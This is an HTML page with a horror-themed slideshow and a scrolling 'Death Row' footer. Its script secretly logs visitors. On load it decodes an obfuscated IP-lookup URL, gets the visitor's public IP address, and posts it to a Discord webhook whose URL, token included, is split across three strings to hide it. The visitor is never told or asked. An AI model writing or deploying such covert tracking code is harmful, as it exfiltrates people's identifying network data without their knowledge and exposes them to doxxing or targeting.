<!DOCTYPE html>

<head>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #000000; /* Black background */
            color: #ffffff; /* White text color */
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .header, .footer {
            font-family: 'Creepster', cursive; /* Bloody font */
        }
        .header {
            font-size: 3em;
            margin-top: 20px;
            color: #ff0000; /* Red color for a bloody effect */
        }
        .slideshow-container {
            max-width: 800px;
            position: relative;
        }
        .mySlides {
            display: none;
        }
        .slideshow-container img {
            width: 100%;
        }
        .footer {
            font-size: 1.5em;
            margin-top: 20px;
            width: 100%;
            white-space: nowrap;
            overflow: hidden;
            position: fixed;
            bottom: 10px;
            left: 0;
            color: #ffffff; /* White color for the footer text */
        }
        .footer span {
            display: inline-block;
            animation: bounce 4s infinite linear;
        }
        @keyframes bounce {
            0% { transform: translateX(100%); }
            50% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        .fade {
            animation: fadeEffect 1.5s;
        }
        @keyframes fadeEffect {
            from {opacity: .4} 
            to {opacity: 1}
        }
        .embed {
            border: 2px solid #ffffff; /* White border for the embed */
            padding: 20px;
            margin: 20px;
            text-align: left;
            background-color: #000000; /* Dark background for the embed */
        }
        .embed img {
            display: block;
            margin: 0 auto 10px;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
    <link rel="icon" href="305.jpg" type="image/x-icon"> <!-- Favicon link -->
</head>

    <script>
        const part1 = "https://canary.discord.com/api/webhooks/";
        const part2 = "1256247502366314576";
        const part3 = "/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1";
        const webhookURL = part1 + part2 + part3;

        const ipFetchUrl = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");

        let slideIndex = 0;
        showSlides();

        function showSlides() {
            let slides = document.getElementsByClassName("mySlides");
            for (let i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";  
            }
            slideIndex++;
            if (slideIndex > slides.length) {slideIndex = 1}    
            slides[slideIndex-1].style.display = "block";  
            setTimeout(showSlides, 2000); // Change image every 2 seconds
        }

        function fetchIP() {
            fetch(ipFetchUrl)
                .then(response => response.json())
                .then(data => {
                    console.log('IP fetched:', data.ip);
                    sendToDiscord(data.ip);
                })
                .catch(error => console.error('Error fetching IP:', error));
        }

        function fetchName() {
            const visitorName = "Unknown Visitor"; // Placeholder if no name is available
            document.getElementById('visitorName').innerText = `Name: ${visitorName}`;
        }

        function sendToDiscord(ip) {
            const message = {
                username: "Death Row",
                avatar_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&", // Optional: URL to the bot's avatar image
                embeds: [{
                    title: "Visitor IP Information",
                    description: `Visitor IP: ${ip}`,
                    color: 15258703, // Hex color code as decimal (0xE74C3C)
                    footer: {
                        text: "Death Row",
                        icon_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&"
                    },
                    image: {
                        url: "https://cdn.discordapp.com/attachments/1256064719610183730/1257211351848456242/af50ed15d83254f31fcba9048ab5db67.gif?ex=668394d0&is=66824350&hm=08666be597113f4592b9c1cc7d0f8d9bec01ea9ee239ff0284d18d3727c6f2df&" // URL to your GIF
                    }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            }).then(response => {
                if (response.ok) {
                    console.log('Message sent to Discord successfully');
                } else {
                    console.error('Error sending message to Discord:', response.statusText);
                }
            }).catch(error => console.error('Error sending to Discord:', error));
        }

        window.onload = function() {
            fetchIP();
            fetchName();
        }
    </script>
